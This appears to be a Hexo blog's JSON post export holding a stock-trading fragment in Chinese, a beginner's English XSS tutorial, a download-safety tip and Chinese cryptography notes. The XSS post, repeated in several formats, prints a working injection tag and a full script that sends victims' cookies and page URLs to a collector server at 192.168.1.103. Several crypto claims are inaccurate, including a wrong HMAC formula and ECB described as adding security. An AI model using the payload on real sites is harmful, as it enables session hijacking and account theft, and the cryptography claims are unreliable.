title=\"《龙虎榜》\"></a>《龙虎榜》</h2><p>看龙虎榜主要是为了揣摩当前市场中最活跃，最顶尖的资金操盘的思路，不管是机构也好游资也好，这些活跃在市场最前沿的资金基本代表了国内最顶尖的操盘水平。而通过龙虎榜观察他们的选股与操盘手法使自己的操作逻辑尽可能靠近市场主流资金的逻辑，这才是龙虎榜最大的意义，因为这些资金特别是游资基本都是小资金做大的，处于整个股市生物链的顶部。</p>\n<p>首先，什么是龙虎榜？龙虎榜是交易所公布的当日异动股票汇总。上榜主要有四个条件：1、日价格涨幅偏离值±7%</p>\n<p>2、日换手率达到20%</p>\n<p>3、日价格振幅达到15%</p>\n<p>4、连续三个交易日内，涨幅偏离值累计达到20%每个条件都选前3名的上榜，深市是分主板、中小板、创业板分别取前3的。具体的大家百度百科，解释龙虎榜不是今天的重点。</p>\n<p>大家应该看到了我上面加粗的两个字“异动”，关键就在这异动上面。谁才有能力让股票的价格出现异动，只有所谓的主力，散户的散单是肯定做不到的，说到主力很多人觉得很神秘，而且喜欢把机构统称主力，其实大家不必太看重名词上的东西，只要是能影响到股价走势的都是可以称为主力，包括机构跟游资。研究散户你永远只能是散户，只有研究主力才能让你进步，而龙虎榜就是我们研究主力操盘选股思路的最好窗口。其次，怎么看龙虎榜？龙虎榜上有两种席位，一种是机构席位，一种是游资席位。机构席位就是什么公募啊、私募啊等等法人账户，他们的资金一般是募集而来，且上榜统一名称为“机构专用”，所以没什么好研究的。而游资席位不一样，游资席位都是自然人账户，就是跟广大散户朋友账户一样的。且游资大部分都是从小资金做起来，而且可以持续跟踪关注，他们才是我们研究对象。</p>\n"},{"layout":"title","title":"How to use XSS","date":"2018-12-17T15:11:06.000Z","_content":"\nAfter following the hack101 video tutorial for a while. I want to write some note about XSS. \n\n## What is XSS\n\nXSS(Cross Site Scripting) is the mix abbreviation for Cascading Style Sheets, CSS. Though it seems out of date at the moment. But to some beginner just like me, it's a good way to experience the fun of looking bugs. \n\n## XSS detecting\nPeople can deploy a DVWA as a dev environment for testing the XSS.\n\nAt the lowest security level of DVWA, the client owns no filter to any users input. It means, input is the output. \n\nThe simplest XSS detecting is the `alert(1)`. Whether create a div or inject a `<script>alert(1)</script>`, the things we focus on is compile the code. \n\n## How hacker use XSS\nSometimes, when the security developer found that bug, he will terminate the XSS, that is one of his duty. But as a cursorily, he needs to use those bug to find why a way to hackin the inside. \nIf the website exists XSS loophole, then it must be able to run the js code.\n\ne.g. we can get the cookies on the page by enter alert(document.cookie). But most of time, hacker don't just inject a snippet of code, since it is no reason to use their own cookie. But they can send the cookies to a platform. Like XSSer, receive the XSS from all over the world. \n\nWhen xsser has done, hacker can insert the script into page like this: \n\n```\n<img   onerror=\"s=createElement('script');body.appendChild(s);s.src='http://192.168.1.103/xss/SMA9ST';\" src=\"x\">\n```\n\nThis is a img tag, the src is point to `x`. Obviously, this address is not exists. So it will run `onerror`. This function will generate a script tag, then point the new script tag to the xsser platform, which we builded before. Once the code request to the xsser. It will get the code, e.g.\n\n```\n(function() {\n\t\t(new Image()).src = 'http://192.168.1.103/xss/index.php?do=api&id=SMA9ST&location=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn document.location.href\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})()) + '&toplocation=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn top.location.href\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})()) + '&cookie=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn document.cookie\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})()) + '&opener=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn (window.opener && window.opener.location.href) ? window.opener.location.href : ''\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})());\n\t})();\n```\n\nIn this code snippet, it also generate a image object and request a xsser project. Than we got the location information and cookies. \n\nEverytime when people open XSS page, the browser will run that kind of code, it mask as a image to send data to xsser.\n\nThat is the simple usage of XSS.\n\n","source":"_posts/[hack]-XSS.md","raw":"---\nlayout: title\ntitle: How to use XSS\ndate: 2018-12-17 09:11:06\ntags: security\ncategories: Hack\n---\n\nAfter following the hack101 video tutorial for a while. I want to write some note about XSS. \n\n## What is XSS\n\nXSS(Cross Site Scripting) is the mix abbreviation for Cascading Style Sheets, CSS. Though it seems out of date at the moment. But to some beginner just like me, it's a good way to experience the fun of looking bugs. \n\n## XSS detecting\nPeople can deploy a DVWA as a dev environment for testing the XSS.\n\nAt the lowest security level of DVWA, the client owns no filter to any users input. It means, input is the output. \n\nThe simplest XSS detecting is the `alert(1)`. Whether create a div or inject a `<script>alert(1)</script>`, the things we focus on is compile the code. \n\n## How hacker use XSS\nSometimes, when the security developer found that bug, he will terminate the XSS, that is one of his duty. But as a cursorily, he needs to use those bug to find why a way to hackin the inside. \nIf the website exists XSS loophole, then it must be able to run the js code.\n\ne.g. we can get the cookies on the page by enter alert(document.cookie). But most of time, hacker don't just inject a snippet of code, since it is no reason to use their own cookie. But they can send the cookies to a platform. Like XSSer, receive the XSS from all over the world. \n\nWhen xsser has done, hacker can insert the script into page like this: \n\n```\n<img   onerror=\"s=createElement('script');body.appendChild(s);s.src='http://192.168.1.103/xss/SMA9ST';\" src=\"x\">\n```\n\nThis is a img tag, the src is point to `x`. Obviously, this address is not exists. So it will run `onerror`. This function will generate a script tag, then point the new script tag to the xsser platform, which we builded before. Once the code request to the xsser. It will get the code, e.g.\n\n```\n(function() {\n\t\t(new Image()).src = 'http://192.168.1.103/xss/index.php?do=api&id=SMA9ST&location=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn document.location.href\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})()) + '&toplocation=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn top.location.href\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})()) + '&cookie=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn document.cookie\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})()) + '&opener=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn (window.opener && window.opener.location.href) ? window.opener.location.href : ''\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})());\n\t})();\n```\n\nIn this code snippet, it also generate a image object and request a xsser project. Than we got the location information and cookies. \n\nEverytime when people open XSS page, the browser will run that kind of code, it mask as a image to send data to xsser.\n\nThat is the simple usage of XSS.\n\n","slug":"[hack]-XSS","published":1,"updated":"2019-03-11T04:31:27.882Z","comments":1,"photos":[],"link":"","_id":"ckkljsasd0016r242uziz3h7s","content":"<p>After following the hack101 video tutorial for a while. I want to write some note about XSS. </p>\n<h2 id=\"What-is-XSS\"><a href=\"#What-is-XSS\" class=\"headerlink\" title=\"What is XSS\"></a>What is XSS</h2><p>XSS(Cross Site Scripting) is the mix abbreviation for Cascading Style Sheets, CSS. Though it seems out of date at the moment. But to some beginner just like me, it’s a good way to experience the fun of looking bugs. </p>\n<h2 id=\"XSS-detecting\"><a href=\"#XSS-detecting\" class=\"headerlink\" title=\"XSS detecting\"></a>XSS detecting</h2><p>People can deploy a DVWA as a dev environment for testing the XSS.</p>\n<p>At the lowest security level of DVWA, the client owns no filter to any users input. It means, input is the output. </p>\n<p>The simplest XSS detecting is the <code>alert(1)</code>. Whether create a div or inject a <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, the things we focus on is compile the code. </p>\n<h2 id=\"How-hacker-use-XSS\"><a href=\"#How-hacker-use-XSS\" class=\"headerlink\" title=\"How hacker use XSS\"></a>How hacker use XSS</h2><p>Sometimes, when the security developer found that bug, he will terminate the XSS, that is one of his duty. But as a cursorily, he needs to use those bug to find why a way to hackin the inside.<br>If the website exists XSS loophole, then it must be able to run the js code.</p>\n<p>e.g. we can get the cookies on the page by enter alert(document.cookie). But most of time, hacker don’t just inject a snippet of code, since it is no reason to use their own cookie. But they can send the cookies to a platform. Like XSSer, receive the XSS from all over the world. </p>\n<p>When xsser has done, hacker can insert the script into page like this: </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img   onerror=&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://192.168.1.103/xss/SMA9ST&apos;;&quot; src=&quot;x&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>This is a img tag, the src is point to <code>x</code>. Obviously, this address is not exists. So it will run <code>onerror</code>. This function will generate a script tag, then point the new script tag to the xsser platform, which we builded before. Once the code request to the xsser. It will get the code, e.g.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(function() &#123;</span><br><span class=\"line\">\t\t(new Image()).src = &apos;http://192.168.1.103/xss/index.php?do=api&amp;id=SMA9ST&amp;location=&apos; + escape((function() &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\treturn document.location.href</span><br><span class=\"line\">\t\t\t&#125; catch (e) &#123;</span><br><span class=\"line\">\t\t\t\treturn &apos;&apos;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;)()) + &apos;&amp;toplocation=&apos; + escape((function() &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\treturn top.location.href</span><br><span class=\"line\">\t\t\t&#125; catch (e) &#123;</span><br><span class=\"line\">\t\t\t\treturn &apos;&apos;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;)()) + &apos;&amp;cookie=&apos; + escape((function() &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\treturn document.cookie</span><br><span class=\"line\">\t\t\t&#125; catch (e) &#123;</span><br><span class=\"line\">\t\t\t\treturn &apos;&apos;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;)()) + &apos;&amp;opener=&apos; + escape((function() &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\treturn (window.opener &amp;&amp; window.opener.location.href) ? window.opener.location.href : &apos;&apos;</span><br><span class=\"line\">\t\t\t&#125; catch (e) &#123;</span><br><span class=\"line\">\t\t\t\treturn &apos;&apos;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;)());</span><br><span class=\"line\">\t&#125;)();</span><br></pre></td></tr></table></figure>\n<p>In this code snippet, it also generate a image object and request a xsser project. Than we got the location information and cookies. </p>\n<p>Everytime when people open XSS page, the browser will run that kind of code, it mask as a image to send data to xsser.</p>\n<p>That is the simple usage of XSS.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>After following the hack101 video tutorial for a while. I want to write some note about XSS. </p>\n<h2 id=\"What-is-XSS\"><a href=\"#What-is-XSS\" class=\"headerlink\" title=\"What is XSS\"></a>What is XSS</h2><p>XSS(Cross Site Scripting) is the mix abbreviation for Cascading Style Sheets, CSS. Though it seems out of date at the moment. But to some beginner just like me, it’s a good way to experience the fun of looking bugs. </p>\n<h2 id=\"XSS-detecting\"><a href=\"#XSS-detecting\" class=\"headerlink\" title=\"XSS detecting\"></a>XSS detecting</h2><p>People can deploy a DVWA as a dev environment for testing the XSS.</p>\n<p>At the lowest security level of DVWA, the client owns no filter to any users input. It means, input is the output. </p>\n<p>The simplest XSS detecting is the <code>alert(1)</code>. Whether create a div or inject a <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, the things we focus on is compile the code. </p>\n<h2 id=\"How-hacker-use-XSS\"><a href=\"#How-hacker-use-XSS\" class=\"headerlink\" title=\"How hacker use XSS\"></a>How hacker use XSS</h2><p>Sometimes, when the security developer found that bug, he will terminate the XSS, that is one of his duty. But as a cursorily, he needs to use those bug to find why a way to hackin the inside.<br>If the website exists XSS loophole, then it must be able to run the js code.</p>\n<p>e.g. we can get the cookies on the page by enter alert(document.cookie). But most of time, hacker don’t just inject a snippet of code, since it is no reason to use their own cookie. But they can send the cookies to a platform. Like XSSer, receive the XSS from all over the world. </p>\n<p>When xsser has done, hacker can insert the script into page like this: </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img   onerror=&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://192.168.1.103/xss/SMA9ST&apos;;&quot; src=&quot;x&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>This is a img tag, the src is point to <code>x</code>. Obviously, this address is not exists. So it will run <code>onerror</code>. This function will generate a script tag, then point the new script tag to the xsser platform, which we builded before. Once the code request to the xsser. It will get the code, e.g.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(function() &#123;</span><br><span class=\"line\">\t\t(new Image()).src = &apos;http://192.168.1.103/xss/index.php?do=api&amp;id=SMA9ST&amp;location=&apos; + escape((function() &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\treturn document.location.href</span><br><span class=\"line\">\t\t\t&#125; catch (e) &#123;</span><br><span class=\"line\">\t\t\t\treturn &apos;&apos;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;)()) + &apos;&amp;toplocation=&apos; + escape((function() &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\treturn top.location.href</span><br><span class=\"line\">\t\t\t&#125; catch (e) &#123;</span><br><span class=\"line\">\t\t\t\treturn &apos;&apos;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;)()) + &apos;&amp;cookie=&apos; + escape((function() &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\treturn document.cookie</span><br><span class=\"line\">\t\t\t&#125; catch (e) &#123;</span><br><span class=\"line\">\t\t\t\treturn &apos;&apos;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;)()) + &apos;&amp;opener=&apos; + escape((function() &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\treturn (window.opener &amp;&amp; window.opener.location.href) ? window.opener.location.href : &apos;&apos;</span><br><span class=\"line\">\t\t\t&#125; catch (e) &#123;</span><br><span class=\"line\">\t\t\t\treturn &apos;&apos;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;)());</span><br><span class=\"line\">\t&#125;)();</span><br></pre></td></tr></table></figure>\n<p>In this code snippet, it also generate a image object and request a xsser project. Than we got the location information and cookies. </p>\n<p>Everytime when people open XSS page, the browser will run that kind of code, it mask as a image to send data to xsser.</p>\n<p>That is the simple usage of XSS.</p>\n"},{"layout":"title","title":"Be careful when we download stuff","date":"2018-12-09T15:11:06.000Z","_content":"\nI want to share tip for keeping our device in safe with us. Whatever you use Mac or PC, even mobile device, anyone are exposed on the threat of attacker. So be careful whenever we download stuff on the Internet. \n\n### HTTPS\n\nAs we all know, `S` mean secure, is the secure version of HTTP, the protocol over wich data is sent between your browser and the website. Far more better than HTTP. \n\nSo we should, firstly, open the website whose address start with https. The download link provided on the main website should also be https. If the downlaod link is not https, there are at least two way to cause agent hijack attack. DNS hijack or Backdoor Factory. \n\n### File falsify test\n\nMost people forget this one, the website also tend to be ignore the file falsify test. It should provide MD5, or better SHA256. \n\nBut most of open source tool website offers original signature. We can use the GPG signature verifcation to make sure whether the file is falsified or not. \n\n```\ngpg --verify xxx.zip.sig yyy.zip\n```\n\n","source":"_posts/[hack]-be-careful-when-download.md","raw":"---\nlayout: title\ntitle: Be careful when we download stuff\ndate: 2018-12-09 09:11:06\ntags: security\ncategories: Hack\n---\n\nI want to share tip for keeping our device in safe with us. Whatever you use Mac or PC, even mobile device, anyone are exposed on the threat of attacker. So be careful whenever we download stuff on the Internet. \n\n### HTTPS\n\nAs we all know, `S` mean secure, is the secure version of HTTP, the protocol over wich data is sent between your browser and the website. Far more better than HTTP. \n\nSo we should, firstly, open the website whose address start with https. The download link provided on the main website should also be https. If the downlaod link is not https, there are at least two way to cause agent hijack attack. DNS hijack or Backdoor Factory. \n\n### File falsify test\n\nMost people forget this one, the website also tend to be ignore the file falsify test. It should provide MD5, or better SHA256. \n\nBut most of open source tool website offers original signature. We can use the GPG signature verifcation to make sure whether the file is falsified or not. \n\n```\ngpg --verify xxx.zip.sig yyy.zip\n```\n\n","slug":"[hack]-be-careful-when-download","published":1,"updated":"2019-03-11T04:51:12.535Z","comments":1,"photos":[],"link":"","_id":"ckkljsase0019r242xbavjxe4","content":"<p>I want to share tip for keeping our device in safe with us. Whatever you use Mac or PC, even mobile device, anyone are exposed on the threat of attacker. So be careful whenever we download stuff on the Internet. </p>\n<h3 id=\"HTTPS\"><a href=\"#HTTPS\" class=\"headerlink\" title=\"HTTPS\"></a>HTTPS</h3><p>As we all know, <code>S</code> mean secure, is the secure version of HTTP, the protocol over wich data is sent between your browser and the website. Far more better than HTTP. </p>\n<p>So we should, firstly, open the website whose address start with https. The download link provided on the main website should also be https. If the downlaod link is not https, there are at least two way to cause agent hijack attack. DNS hijack or Backdoor Factory. </p>\n<h3 id=\"File-falsify-test\"><a href=\"#File-falsify-test\" class=\"headerlink\" title=\"File falsify test\"></a>File falsify test</h3><p>Most people forget this one, the website also tend to be ignore the file falsify test. It should provide MD5, or better SHA256. </p>\n<p>But most of open source tool website offers original signature. We can use the GPG signature verifcation to make sure whether the file is falsified or not. </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gpg --verify xxx.zip.sig yyy.zip</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>I want to share tip for keeping our device in safe with us. Whatever you use Mac or PC, even mobile device, anyone are exposed on the threat of attacker. So be careful whenever we download stuff on the Internet. </p>\n<h3 id=\"HTTPS\"><a href=\"#HTTPS\" class=\"headerlink\" title=\"HTTPS\"></a>HTTPS</h3><p>As we all know, <code>S</code> mean secure, is the secure version of HTTP, the protocol over wich data is sent between your browser and the website. Far more better than HTTP. </p>\n<p>So we should, firstly, open the website whose address start with https. The download link provided on the main website should also be https. If the downlaod link is not https, there are at least two way to cause agent hijack attack. DNS hijack or Backdoor Factory. </p>\n<h3 id=\"File-falsify-test\"><a href=\"#File-falsify-test\" class=\"headerlink\" title=\"File falsify test\"></a>File falsify test</h3><p>Most people forget this one, the website also tend to be ignore the file falsify test. It should provide MD5, or better SHA256. </p>\n<p>But most of open source tool website offers original signature. We can use the GPG signature verifcation to make sure whether the file is falsified or not. </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gpg --verify xxx.zip.sig yyy.zip</span><br></pre></td></tr></table></figure>\n"},{"layout":"title","title":"密码学的一些概念","date":"2018-12-11T15:11:06.000Z","_content":"\n## XOR\n异或运算的概念肯定大家已经熟悉了。我们知道，XOR运算两次的时候就会使其得到原来的值。这一个特点可以用于我们最为熟知加密运算。\n\n当然，这必然是一次性的 One-Time Pad\n\n## Types of Ciphers\n我们可以将加密主要分为两类：\n1. Symmetric -- 使用同样的key\n\n+ Stream 按照byte来加密\n\n常见的比如RC4，我们熟知的SSL，他使用随机数并XOR每一个byte来加密数据；解密也是只要XOR密文，这意味着这两个操作需要完全一致/identical\n\n根据这个定义，我们就可以构建一个简单的stream cipher，通过PRNG和seeding\n\n算法的强度仅仅依赖于随机的质量，毕竟都是伪随机; better quality of random output, stronger the encryption\n\n+ Block 按照block加密\n\nBlock Cipher 可能更加熟悉一些，AES（Rijndael），DES，3DES，TwoFish之类的\n\n在block cipher里，数据被分为N-byte个块，然后分开加密。同时我们也不知道数据是怎样被分割的，我们不得不填补它，增加了复杂度。同时，加密和解密不是相同的。\n\n也因为是通过block加密，许多的模式能够增加安全性，比如ECB Mode。\n\nElectronic CodeBook mode是最简单的block cipher。每一个明文block独立的加密为密文。这意味着相同的密文对应着相同的明文。\n\nCBC加密，Cipher Block Chaining同样很常见。每一个明文block在加密前使用XOR与前一个密文进行运算。这样避免了ECB模式的缺陷。因为每一个block存在于一个类似于链式结构的情况，于是可能导致一些有趣的bug。\n\n2. Asymmetric -- 使用private key\n\n对于非对称加密，最常见的就是RSA了，使用公钥和私钥。同时非对称加密也可以用于加密和签名。也有时候非对称加密没有直接用于加密是因为性能和复杂度的原因。\n\n## HASHES\nHashes也组成了加密的重要部分，一个常见的hash方法 128-512 MD5 SHA1、SHA256。\n\nhash对于单独的object加密十分有帮助，决定了数据的integrity。\n\n## MACs\nMessage Authentication Codes通常基于hashes，这就意味着对于给定的MAC，你们可以确保数据没有被干扰，同时验证MAC能没有被篡改。这是因为，你需要共享同样的key用来验证MAC，如果没有就不能创建一个有效的MAC\n\n\n## HMAC\n最著名的MAC就是HMAC，使用一个简单的结构：\nHMAC(key, message) = hash(key + hash(key + message))\n\nKey被各自的哈希算法填充，是十分最简单的一种了。","source":"_posts/[hack]-crypto-crash.md","raw":"---\nlayout: title\ntitle: 密码学的一些概念\ndate: 2018-12-11 09:11:06\ntags: cryptography\ncategories: Hack\n---\n\n## XOR\n异或运算的概念肯定大家已经熟悉了。我们知道，XOR运算两次的时候就会使其得到原来的值。这一个特点可以用于我们最为熟知加密运算。\n\n当然，这必然是一次性的 One-Time Pad\n\n## Types of Ciphers\n我们可以将加密主要分为两类：\n1. Symmetric -- 使用同样的key\n\n+ Stream 按照byte来加密\n\n常见的比如RC4，我们熟知的SSL，他使用随机数并XOR每一个byte来加密数据；解密也是只要XOR密文，这意味着这两个操作需要完全一致/identical\n\n根据这个定义，我们就可以构建一个简单的stream cipher，通过PRNG和seeding\n\n算法的强度仅仅依赖于随机的质量，毕竟都是伪随机; better quality of random output, stronger the encryption\n\n+ Block 按照block加密\n\nBlock Cipher 可能更加熟悉一些，AES（Rijndael），DES，3DES，TwoFish之类的\n\n在block cipher里，数据被分为N-byte个块，然后分开加密。同时我们也不知道数据是怎样被分割的，我们不得不填补它，增加了复杂度。同时，加密和解密不是相同的。\n\n也因为是通过block加密，许多的模式能够增加安全性，比如ECB Mode。\n\nElectronic CodeBook mode是最简单的block cipher。每一个明文block独立的加密为密文。这意味着相同的密文对应着相同的明文。\n\nCBC加密，Cipher Block Chaining同样很常见。每一个明文block在加密前使用XOR与前一个密文进行运算。这样避免了ECB模式的缺陷。因为每一个block存在于一个类似于链式结构的情况，于是可能导致一些有趣的bug。\n\n2. Asymmetric -- 使用private key\n\n对于非对称加密，最常见的就是RSA了，使用公钥和私钥。同时非对称加密也可以用于加密和签名。也有时候非对称加密没有直接用于加密是因为性能和复杂度的原因。\n\n## HASHES\nHashes也组成了加密的重要部分，一个常见的hash方法 128-512 MD5 SHA1、SHA256。\n\nhash对于单独的object加密十分有帮助，决定了数据的integrity。\n\n## MACs\nMessage Authentication Codes通常基于hashes，这就意味着对于给定的MAC，你们可以确保数据没有被干扰，同时验证MAC能没有被篡改。这是因为，你需要共享同样的key用来验证MAC，如果没有就不能创建一个有效的MAC\n\n\n## HMAC\n最著名的MAC就是HMAC，使用一个简单的结构：\nHMAC(key, message) = hash(key + hash(key + message))\n\nKey被各自的哈希算法填充，是十分最简单的一种了。","slug":"[hack]-crypto-crash","published":1,"updated":"2019-03-11T04:25:11.103Z","comments":1,"photos":[],"link":"","_id":"ckkljsasf001dr242ay50y3yp","content":"<h2 id=\"XOR\"><a href=\"#XOR\" class=\"headerlink\" title=\"XOR\"></a>XOR</h2><p>异或运算的概念肯定大家已经熟悉了。我们知道，XOR运算两次的时候就会使其得到原来的值。这一个特点可以用于我们最为熟知加密运算。</p>\n<p>当然，这必然是一次性的 One-Time Pad</p>\n<h2 id=\"Types-of-Ciphers\"><a href=\"#Types-of-Ciphers\" class=\"headerlink\" title=\"Types of Ciphers\"></a>Types of Ciphers</h2><p>我们可以将加密主要分为两类：</p>\n<ol>\n<li>Symmetric – 使用同样的key</li>\n</ol>\n<ul>\n<li>Stream 按照byte来加密</li>\n</ul>\n<p>常见的比如RC4，我们熟知的SSL，他使用随机数并XOR每一个byte来加密数据；解密也是只要XOR密文，这意味着这两个操作需要完全一致/identical</p>\n<p>根据这个定义，我们就可以构建一个简单的stream cipher，通过PRNG和seeding</p>\n<p>算法的强度仅仅依赖于随机的质量，毕竟都是伪随机; better quality of random output, stronger the encryption</p>\n<ul>\n<li>Block 按照block加密</li>\n</ul>\n<p>Block Cipher 可能更加熟悉一些，AES（Rijndael），DES，3DES，TwoFish之类的</p>\n<p>在block cipher里，数据被分为N-byte个块，然后分开加密。同时我们也不知道数据是怎样被分割的，我们不得不填补它，增加了复杂度。同时，加密和解密不是相同的。</p>\n<p>也因为是通过block加密，许多的模式能够增加安全性，比如ECB Mode。</p>\n<p>Electronic CodeBook mode是最简单的block cipher。每一个明文block独立的加密为密文。这意味着相同的密文对应着相同的明文。</p>\n<p>CBC加密，Cipher Block Chaining同样很常见。每一个明文block在加密前使用XOR与前一个密文进行运算。这样避免了ECB模式的缺陷。因为每一个block存在于一个类似于链式结构的情况，于是可能导致一些有趣的bug。</p>\n<ol start=\"2\">\n<li>Asymmetric – 使用private key</li>\n</ol>\n<p>对于非对称加密，最常见的就是RSA了，使用公钥和私钥。同时非对称加密也可以用于加密和签名。也有时候非对称加密没有直接用于加密是因为性能和复杂度的原因。</p>\n<h2 id=\"HASHES\"><a href=\"#HASHES\" class=\"headerlink\" title=\"HASHES\"></a>HASHES</h2><p>Hashes也组成了加密的重要部分，一个常见的hash方法 128-512 MD5 SHA1、SHA256。</p>\n<p>hash对于单独的object加密十分有帮助，决定了数据的integrity。</p>\n<h2 id=\"MACs\"><a href=\"#MACs\" class=\"headerlink\" title=\"MACs\"></a>MACs</h2><p>Message Authentication Codes通常基于hashes，这就意味着对于给定的MAC，你们可以确保数据没有被干扰，同时验证MAC能没有被篡改。这是因为，你需要共享同样的key用来验证MAC，如果没有就不能创建一个有效的MAC</p>\n<h2 id=\"HMAC\"><a href=\"#HMAC\" class=\"headerlink\" title=\"HMAC\"></a>HMAC</h2><p>最著名的MAC就是HMAC，使用一个简单的结构：<br>HMAC(key, message) = hash(key + hash(key + message))</p>\n<p>Key被各自的哈希算法填充，是十分最简单的一种了。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"XOR\"><a href=\"#XOR\" class=\"headerlink\" title=\"XOR\"></a>XOR</h2><p>异或运算的概念肯定大家已经熟悉了。我们知道，XOR运算两次的时候就会使其得到原来的值。这一个特点可以用于我们最为熟知加密运算。</p>\n<p>当然，这必然是一次性的 One-Time Pad</p>\n<h2 id=\"Types-of-Ciphers\"><a href=\"#Types-of-Ciphers\" class=\"headerlink\" title=\"Types of Ciphers\"></a>Types of Ciphers</h2><p>我们可以将加密主要分为两类：</p>\n<ol>\n<li>Symmetric – 使用同样的key</li>\n</ol>\n<ul>\n<li>Stream 按照byte来加密</li>\n</ul>\n<p>常见的比如RC4，我们熟知的SSL，他使用随机数并XOR每一个byte来加密数据；解密也是只要XOR密文，这意味着这两个操作需要完全一致/identical</p>\n<p>根据这个定义，我们就可以构建一个简单的stream cipher，通过PRNG和seeding</p>\n<p>算法的强度仅仅依赖于随机的质量，毕竟都是伪随机; better quality of random output, stronger the encryption</p>\n<ul>\n<li>Block 按照block加密</li>\n</ul>\n<p>Block Cipher 可能更加熟悉一些，AES（Rijndael），DES，3DES，TwoFish之类的</p>\n<p>在block cipher里，数据被分为N-byte个块，然后分开加密。同时我们也不知道数据是怎样被分割的，我们不得不填补它，增加了复杂度。同时，加密和解密不是相同的。</p>\n<p>也因为是通过block加密，许多的模式能够增加安全性，比如ECB Mode。</p>\n<p>Electronic CodeBook mode是最简单的block cipher。每一个明文block独立的加密为密文。这意味着相同的密文对应着相同的明文。</p>\n<p>CBC加密，Cipher Block 